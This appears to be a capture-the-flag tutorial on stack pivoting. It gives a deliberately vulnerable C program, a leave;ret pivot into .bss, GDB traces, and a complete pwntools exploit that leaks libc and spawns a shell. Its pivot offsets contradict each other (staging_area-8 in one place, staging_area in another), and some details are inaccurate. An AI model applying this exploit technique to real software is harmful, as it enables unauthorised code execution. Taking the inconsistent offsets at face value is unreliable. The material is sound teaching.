---
title: "Pwn - Stack Pivot"
description: "Pivoting the stack to a controlled buffer when overflow space is too small for a full ROP chain — using leave;ret to redirect RSP and build exploitation from a fake stack frame."
author: "Zemi"
---

## Challenge Info

| Detail     | Value                                |
|------------|--------------------------------------|
| Category   | Binary Exploitation                  |
| Difficulty | Extreme                              |
| Points     | 500                                  |
| Flag       | `zemi{st4ck_p1v0t_m4st3r_cl4ss}`    |

## Challenge Files

Download the challenge files to get started:

- [pivot.c](/Website/challenges/pwn-stack-pivot/pivot.c)
- [Makefile](/Website/challenges/pwn-stack-pivot/Makefile)
- [flag.txt](/Website/challenges/pwn-stack-pivot/flag.txt)

## Prerequisites

Before attempting this challenge, you should have completed:

- **Pwn - Buffer Overflow** — understanding stack layout and overflow mechanics
- **Pwn - ret2win** — controlling the return address
- **Pwn - ROP Chains** — building multi-gadget chains on the stack
- **Pwn - ret2libc** — calling libc functions via ROP

You need a solid grasp of how the stack works, what `RSP` and `RBP` do, and how `call`/`ret` and `leave`/`ret` interact. If any of those are fuzzy, go back and review.

## Introduction

In every ROP challenge so far, the buffer overflow gave us plenty of room. We could write dozens of gadget addresses onto the stack and chain them into any sequence we wanted. But real-world binaries are rarely so generous.

What if you can only overflow **16 bytes** past the saved return address? That is enough for exactly two addresses — maybe a `pop rdi; ret` and a function pointer. You cannot fit a leak, a second stage, or an `execve` setup. Your ROP chain is dead on arrival.

This is where **stack pivoting** saves the day. Instead of building the ROP chain on the real stack, we write it somewhere else — a large buffer in `.bss`, a heap allocation, or any writable memory we control — and then **redirect RSP** to point there. The CPU does not care where the stack is. If RSP points to it, that is the stack.

## What Is Stack Pivoting?

Stack pivoting is the technique of changing the value of `RSP` (the stack pointer) to point to attacker-controlled memory, then executing a ROP chain from that new location.

The key insight: **the `leave` instruction is `mov rsp, rbp; pop rbp`**. If we control `RBP`, we control where `RSP` ends up after `leave` executes. A `leave; ret` gadget at the end of a function epilogue becomes our pivot mechanism.

### The leave;ret Gadget

Let's break down what happens at the end of a normal function:

```nasm
leave       ; mov rsp, rbp    -> RSP = RBP
            ; pop rbp         -> RBP = [RSP], RSP += 8
ret         ; pop rip         -> RIP = [RSP], RSP += 8
```

Normally, `RBP` points to the saved frame pointer on the real stack, so `leave` restores the caller's stack frame. But if we overwrite the saved `RBP` with an address pointing to our fake stack, `leave` will set `RSP` to our controlled buffer. Then `ret` will pop the first address from our fake stack into `RIP`, and we are executing our ROP chain from the pivoted location.

### Why Not Just Use a `pop rsp; ret` Gadget?

You sometimes can. If you find a `pop rsp; ret` gadget, that directly sets RSP from the stack. But these gadgets are rare. The `leave; ret` gadget exists in virtually every binary because it is the standard function epilogue. Stack pivoting via `leave; ret` is the universal approach.

## The Attack Plan

```
Step 1: Write a full ROP chain to a known writable address (e.g., .bss)
Step 2: Overwrite saved RBP with (target_address - 8)
Step 3: Overwrite saved RIP with address of a `leave; ret` gadget
Step 4: When the function returns:
        - leave: RSP = RBP = (target_address - 8), then pop RBP from [RSP]
        - Now RSP = target_address
        - ret: pops first ROP gadget from our fake stack
        - ROP chain executes from the pivoted stack
```

Why `target_address - 8`? Because `leave` does `mov rsp, rbp` and then `pop rbp`. The `pop rbp` consumes 8 bytes, advancing RSP by 8. So if we want RSP to land at `target_address` after the pop, we set RBP to `target_address - 8`. The first 8 bytes at `target_address - 8` become the new (junk) RBP, and the actual ROP chain starts at `target_address`.

## Vulnerable Source Code

```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>

// Compiled: gcc -fno-stack-protector -no-pie -o pivot pivot.c

char staging_area[0x400];  // Large buffer in .bss — our pivot target

void setup() {
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

void stage_payload() {
    printf("Stage your payload:\n");
    // We can write up to 0x400 bytes into staging_area
    read(0, staging_area, sizeof(staging_area));
}

void vulnerable() {
    char buf[64];
    printf("Short overflow:\n");
    // Only reads 88 bytes: 64 (buf) + 8 (saved RBP) + 16 (tiny overflow)
    // That's only 16 bytes past saved return address — 2 gadgets max
    read(0, buf, 88);
}

int main() {
    setup();
    printf("staging_area @ %p\n", staging_area);
    stage_payload();
    vulnerable();
    return 0;
}
```

### Compilation

```bash
gcc -fno-stack-protector -no-pie -o pivot pivot.c
```

Protections summary:
- **NX enabled** — no shellcode on stack
- **No PIE** — addresses are fixed, `.bss` address is known
- **No stack canary** — we can overflow freely
- **ASLR on** — but `.bss` is in the binary (no-pie), so it is at a fixed address

### Why the Overflow Is Not Enough

The `vulnerable()` function reads 88 bytes into a 64-byte buffer. That gives us:
- 64 bytes of buffer fill
- 8 bytes to overwrite saved RBP
- 16 bytes past saved RBP (saved RIP + one more qword)

With 16 bytes, we can write exactly **two addresses**. A typical ROP chain to call `execve("/bin/sh", 0, 0)` needs at minimum 6-8 addresses. We simply do not have the space on the real stack.

But we have `staging_area` — a 1024-byte buffer at a known address in `.bss`. If we can get RSP to point there, we have all the room we need.

## Stack Layout Analysis

### Before Overflow

```
                    vulnerable()'s Stack Frame
                    ==========================

Low addresses
     |
     v
+--------------------+  <- RSP (start of buf)
|   buf[0..7]        |
+--------------------+
|   buf[8..15]       |
+--------------------+
|       ...          |
+--------------------+
|   buf[56..63]      |
+--------------------+  <- RBP points here
|   Saved RBP        |  (8 bytes — old RBP from main)
+--------------------+
|   Saved RIP        |  (8 bytes — return address to main)
+--------------------+
|   (beyond)         |  We can write 8 more bytes here
+--------------------+

High addresses
```

### After Our Overflow

```
+--------------------+  <- RSP
|   64 bytes of 'A'  |  (padding to fill buf)
|   ...              |
+--------------------+  <- RBP
| &staging_area - 8  |  (fake RBP — will become new RSP after leave)
+--------------------+
| &(leave; ret)      |  (overwrite saved RIP with leave;ret gadget)
+--------------------+
|   (unused 8 bytes) |  (we have space but don't need it)
+--------------------+
```

### The Fake Stack in .bss

```
staging_area - 8:
+--------------------+
|   0xdeadbeef       |  (junk — popped into RBP by leave, don't care)
+--------------------+  <- staging_area (RSP lands here after pivot)
|   pop rdi; ret     |  START OF ROP CHAIN
+--------------------+
|   &"/bin/sh"       |
+--------------------+
|   pop rsi; ret     |
+--------------------+
|   0x0              |
+--------------------+
|   pop rdx; ret     |
+--------------------+
|   0x0              |
+--------------------+
|   pop rax; ret     |
+--------------------+
|   59 (execve)      |
+--------------------+
|   syscall           |
+--------------------+
```

## Exploitation Walkthrough

### Step 1: Reconnaissance

```bash
$ checksec --file=pivot
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

```bash
$ objdump -t pivot | grep staging_area
0000000000404060 g     O .bss   0000000000000400 staging_area
```

The staging area is at `0x404060`. This is a fixed address because PIE is disabled.

### Step 2: Finding Gadgets

```bash
$ ROPgadget --binary pivot | grep "leave ; ret"
0x00000000004011f9 : leave ; ret

$ ROPgadget --binary pivot | grep "pop rdi ; ret"
0x0000000000401263 : pop rdi ; ret

$ ROPgadget --binary pivot | grep "pop rsi"
0x0000000000401261 : pop rsi ; pop r15 ; ret

$ ROPgadget --binary pivot | grep "pop rdx"
(none found in the binary itself — we'll use libc or call system() instead)
```

Since this is a dynamically linked no-pie binary, we have limited gadgets. Let's use `system("/bin/sh")` from libc instead of `execve`. But wait — ASLR means we don't know libc addresses. We need to **leak** libc first.

Our strategy:
1. **Stage 1** (fake stack): Leak a libc address via `puts(got.puts)`, then call `stage_payload` again to load a second ROP chain, then call `vulnerable` again to pivot a second time.
2. **Stage 2** (second fake stack): Call `system("/bin/sh")` with the leaked libc base.

### Step 3: GDB Walkthrough

```bash
$ gdb -q ./pivot
gef> break vulnerable
gef> run
staging_area @ 0x404060
Stage your payload:
AAAA
Short overflow:
BBBB

gef> info frame
Stack level 0, frame at 0x7fffffffe3b0:
 rip = 0x4011c7 in vulnerable; saved rip = 0x401210
 Arglist at 0x7fffffffe3a0, args:
 Locals at 0x7fffffffe3a0, Previous frame's sp is 0x7fffffffe3b0
 Saved registers:
  rbp at 0x7fffffffe3a0, rip at 0x7fffffffe3a8
```

Let's verify the pivot works. Set a breakpoint at the `leave; ret` and step through:

```bash
gef> break *0x4011f9
gef> continue

# After sending the exploit payload:
gef> x/i $rip
=> 0x4011f9:    leave
gef> info registers rbp
rbp            0x404058   0x404058    <-- staging_area - 8

gef> si
# After leave: mov rsp, rbp; pop rbp
gef> info registers rsp
rsp            0x404060   0x404060    <-- RSP now points to staging_area!

gef> x/10gx $rsp
0x404060:  0x0000000000401263  0x0000000000404018   <-- pop rdi; &GOT[puts]
0x404070:  0x0000000000401060  0x00000000004011a0   <-- puts@plt; stage_payload
0x404080:  ...
```

The pivot worked. RSP is now pointing to our fake stack in `.bss`, and the ROP chain is about to execute.

### Step 4: Understanding the Two-Stage Attack

**Stage 1 ROP chain** (written to `staging_area`):
```
pop rdi; ret
GOT[puts]            <- leak puts' real address
puts@plt             <- call puts to print the address
stage_payload@plt    <- call stage_payload to load stage 2
vulnerable           <- call vulnerable again to pivot again
```

After stage 1 executes:
- `puts` prints its own GOT entry (the real libc address)
- `stage_payload` lets us write a NEW ROP chain to `staging_area`
- `vulnerable` gives us another overflow to pivot again

**Stage 2 ROP chain** (written to `staging_area` after leak):
```
pop rdi; ret
&"/bin/sh"           <- address of "/bin/sh" in libc (calculated from leak)
system               <- libc system() address (calculated from leak)
```

## Full Exploit

```python
#!/usr/bin/env python3
from pwn import *

# Binary setup
elf = ELF('./pivot')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # adjust path as needed
context.binary = elf

# Addresses (no PIE — these are fixed)
staging_area = elf.symbols['staging_area']      # 0x404060
leave_ret = 0x4011f9                             # leave; ret gadget
pop_rdi = 0x401263                               # pop rdi; ret
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
stage_payload = elf.symbols['stage_payload']
vulnerable = elf.symbols['vulnerable']

log.info(f"staging_area: {hex(staging_area)}")
log.info(f"leave;ret:    {hex(leave_ret)}")
log.info(f"pop rdi:      {hex(pop_rdi)}")

# ========== STAGE 1: Leak libc ==========
p = process('./pivot')

# Read the staging_area address (printed by the binary)
p.recvuntil(b'staging_area @ ')
leaked_staging = int(p.recvline().strip(), 16)
log.info(f"Confirmed staging_area: {hex(leaked_staging)}")

# Build Stage 1 ROP chain for the fake stack in .bss
stage1_chain = b''
stage1_chain += p64(pop_rdi)
stage1_chain += p64(puts_got)          # rdi = &GOT[puts]
stage1_chain += p64(puts_plt)          # call puts() to leak address
stage1_chain += p64(stage_payload)     # return to stage_payload for stage 2
stage1_chain += p64(vulnerable)        # then call vulnerable again to pivot

# Send stage 1 payload to staging_area
p.recvuntil(b'Stage your payload:\n')
# We write the junk RBP value (8 bytes) BEFORE the ROP chain
# because leave does: mov rsp, rbp; pop rbp
# So RSP = staging_area - 8, then pop rbp eats 8 bytes, RSP = staging_area
# Actually, we write to staging_area directly via read(), so
# the first 8 bytes at staging_area will be popped as RBP (junk),
# and the ROP chain starts at staging_area + 8.
# We need to adjust: set fake RBP = staging_area (not staging_area - 8)
# so after leave: RSP = staging_area, pop rbp eats [staging_area], RSP = staging_area + 8
# Then ret pops from staging_area + 8.

# Let me re-derive this carefully:
# In vulnerable(), we overwrite saved RBP with FAKE_RBP.
# When vulnerable()'s leave executes: RSP = FAKE_RBP, then pop RBP => RBP = [FAKE_RBP], RSP = FAKE_RBP + 8
# Then ret => RIP = [FAKE_RBP + 8], RSP = FAKE_RBP + 16
# So FAKE_RBP + 8 should be where our first gadget address is.
# staging_area is where we write. Byte 0 of staging_area = junk for pop rbp.
# Byte 8 of staging_area = first gadget.
# So FAKE_RBP = staging_area.

payload_stage1 = p64(0xdeadbeef)  # junk RBP (popped by leave, we don't care)
payload_stage1 += stage1_chain
p.send(payload_stage1)

# Now overflow in vulnerable(): overwrite saved RBP and saved RIP
p.recvuntil(b'Short overflow:\n')
overflow = b'A' * 64               # fill buf
overflow += p64(staging_area)       # overwrite saved RBP (FAKE_RBP)
overflow += p64(leave_ret)          # overwrite saved RIP with leave;ret
p.send(overflow)

# Receive the libc leak
leaked_puts = u64(p.recvline().strip().ljust(8, b'\x00'))
libc.address = leaked_puts - libc.symbols['puts']
log.success(f"Leaked puts: {hex(leaked_puts)}")
log.success(f"Libc base:   {hex(libc.address)}")

# ========== STAGE 2: system("/bin/sh") ==========

# Build Stage 2 ROP chain
# We need a ret gadget for stack alignment
ret = leave_ret + 1  # ret gadget (the ret part of leave;ret)

stage2_chain = b''
stage2_chain += p64(ret)                          # stack alignment
stage2_chain += p64(pop_rdi)
stage2_chain += p64(next(libc.search(b'/bin/sh'))) # rdi = "/bin/sh"
stage2_chain += p64(libc.symbols['system'])        # call system

# Send stage 2 payload to staging_area
p.recvuntil(b'Stage your payload:\n')
payload_stage2 = p64(0xdeadbeef)  # junk RBP again
payload_stage2 += stage2_chain
p.send(payload_stage2)

# Pivot again
p.recvuntil(b'Short overflow:\n')
overflow2 = b'A' * 64
overflow2 += p64(staging_area)     # FAKE_RBP
overflow2 += p64(leave_ret)        # leave;ret
p.send(overflow2)

# Shell!
p.interactive()
```

### Running the Exploit

```bash
$ python3 exploit.py
[*] '/home/user/pivot'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] staging_area: 0x404060
[*] leave;ret:    0x4011f9
[*] pop rdi:      0x401263
[+] Leaked puts: 0x7f3a2c45ed90
[+] Libc base:   0x7f3a2c3e0000
[*] Switching to interactive mode
$ cat flag.txt
zemi{st4ck_p1v0t_m4st3r_cl4ss}
```

## Detailed Stack Pivot Execution Trace

Let's walk through the exact register and stack state at every step during the pivot:

```
=== vulnerable() is about to return ===

Before 'leave' instruction:
  RSP = 0x7fffffffe360  (pointing at buf on real stack)
  RBP = 0x7fffffffe3a0  (current frame pointer)

  Stack at RBP:
  0x7fffffffe3a0: 0x0000000000404060   <- saved RBP (overwritten with staging_area)
  0x7fffffffe3a8: 0x00000000004011f9   <- saved RIP (overwritten with leave;ret)

=== 'leave' executes ===
  Step 1: mov rsp, rbp  =>  RSP = 0x7fffffffe3a0
  Step 2: pop rbp       =>  RBP = [0x7fffffffe3a0] = 0x404060 (staging_area)
                             RSP = 0x7fffffffe3a8

=== 'ret' executes ===
  pop rip  =>  RIP = [0x7fffffffe3a8] = 0x4011f9 (leave;ret again!)
               RSP = 0x7fffffffe3b0

=== Second 'leave' executes (this is the actual pivot!) ===
  Step 1: mov rsp, rbp  =>  RSP = 0x404060 (staging_area!)
  Step 2: pop rbp       =>  RBP = [0x404060] = 0xdeadbeef (junk)
                             RSP = 0x404068

*** RSP is now pointing into staging_area! Stack has been pivoted! ***

=== Second 'ret' executes ===
  pop rip  =>  RIP = [0x404068] = 0x401263 (pop rdi; ret)
               RSP = 0x404070

=== ROP chain runs from .bss ===
  pop rdi  =>  RDI = [0x404070] = 0x404018 (GOT[puts])
               RSP = 0x404078
  ret      =>  RIP = [0x404078] = puts@plt
  ...
```

Notice we used `leave; ret` **twice**: once in the function epilogue (which loads our fake RBP), and once as our overwritten return address (which actually performs the pivot). This "double leave;ret" pattern is the classic stack pivot.

## Common Pitfalls

### 1. Off-by-8 Errors

The most common mistake is getting the FAKE_RBP value wrong. Remember:
- `leave` does `mov rsp, rbp` then `pop rbp`
- The `pop rbp` consumes 8 bytes at [RSP]
- Your ROP chain starts at FAKE_RBP + 8, not FAKE_RBP
- Write junk at FAKE_RBP, first gadget at FAKE_RBP + 8

### 2. Stack Alignment

If you get a SIGSEGV inside `system()` or any libc function that uses SSE instructions (like `movaps`), your stack is misaligned. The x86-64 ABI requires RSP to be 16-byte aligned before a `call`. Add a single `ret` gadget to your chain to fix alignment.

### 3. Choosing the Pivot Target

The pivot target must be:
- **Writable** — you need to put your ROP chain there
- **At a known address** — you need to set RBP to it
- **Large enough** — for your entire ROP chain
- **Not conflicting** — don't pivot to memory that will be overwritten

Good candidates: `.bss` section, global arrays, heap allocations (if you can leak the address).

### 4. Single-Shot vs. Two-Stage

If the binary doesn't give you a way to pre-load the fake stack (like our `stage_payload` function), you may need to:
- Use the overflow itself to write to `.bss` via `read()` in your tiny ROP chain
- Chain: `pop rdi; ret | 0 (stdin) | pop rsi; pop r15; ret | bss_addr | junk | read@plt | leave;ret` (but this may exceed your limited space)

### 5. Forgetting the Double leave;ret

A single `leave; ret` at the function epilogue only sets RBP. You need the overwritten return address to also be `leave; ret` to perform the actual pivot. The first `leave` loads our fake RBP; the second `leave` uses it to move RSP.

Wait — actually, let me correct this. You can do it with a single `leave; ret` too, depending on how the function epilogue works. If the function epilogue already has `leave; ret`, then overwriting saved RBP with your target and letting the existing epilogue run will pivot in one shot. The key is that saved RBP gets loaded into RBP by the epilogue's `leave`, and then either:
- The existing `ret` goes to your `leave; ret` gadget (double leave;ret), or
- You control what runs next in a way that eventually executes another `leave`

In our exploit, we overwrite saved RIP with `leave; ret`, so the function epilogue does `leave` (loading our fake RBP), then `ret` (jumping to our `leave; ret` gadget), then the gadget's `leave` pivots RSP.

## Alternative Pivot Techniques

### pop rsp; ret

If you find this gadget, pivoting is simpler:

```
overflow = padding + p64(pop_rsp_ret) + p64(staging_area)
```

One gadget sets RSP directly. No need for the double-leave trick.

### xchg rax, rsp; ret

If you control RAX (e.g., from a function return value) and find an `xchg` gadget:

```
# If rax = staging_area after some call
overflow = padding + p64(xchg_rax_rsp_ret)
```

### Using a Large Read in the Tiny Chain

If there is no pre-staging function, use the limited overflow space to call `read()` to write a ROP chain to `.bss`, then pivot:

```
tiny_chain = p64(pop_rdi) + p64(0)         # fd = stdin
# ...set up rsi, rdx for read(0, bss, 0x400)
# This may or may not fit in 16 bytes. If not, get creative.
```

## Tools Used

| Tool       | Purpose                                         |
|------------|------------------------------------------------|
| GCC        | Compile the vulnerable binary                   |
| checksec   | Check binary protections                         |
| GDB + GEF  | Debug and trace the pivot step-by-step          |
| ROPgadget  | Find `leave;ret`, `pop rdi;ret`, etc.           |
| pwntools   | Build and send the exploit                       |
| objdump    | Find `.bss` addresses for staging_area          |
| readelf    | Examine sections and symbols                     |

## Lessons Learned

1. **Limited overflow is not game over.** Even a few bytes past the return address can be enough if you can pivot to a larger buffer.

2. **`leave; ret` is the universal pivot gadget.** It exists in nearly every binary because it is the standard function epilogue. Learn the `mov rsp, rbp; pop rbp` semantics cold.

3. **Think in two stages.** Stage 1 leaks information and sets up Stage 2. Stage 2 does the actual exploitation. This pattern recurs throughout advanced pwn.

4. **The stack is just memory.** RSP is just a register. The CPU does not enforce that the stack must be in any particular memory region. Wherever RSP points, that is the stack.

5. **Precision matters.** Off-by-8 errors will silently redirect execution to garbage. Use GDB to verify every step of the pivot before running the full exploit.

6. **Stack pivoting is a building block.** Many advanced techniques (heap exploitation, kernel exploitation, browser exploitation) use stack pivots as a primitive. Mastering this now pays off enormously later.
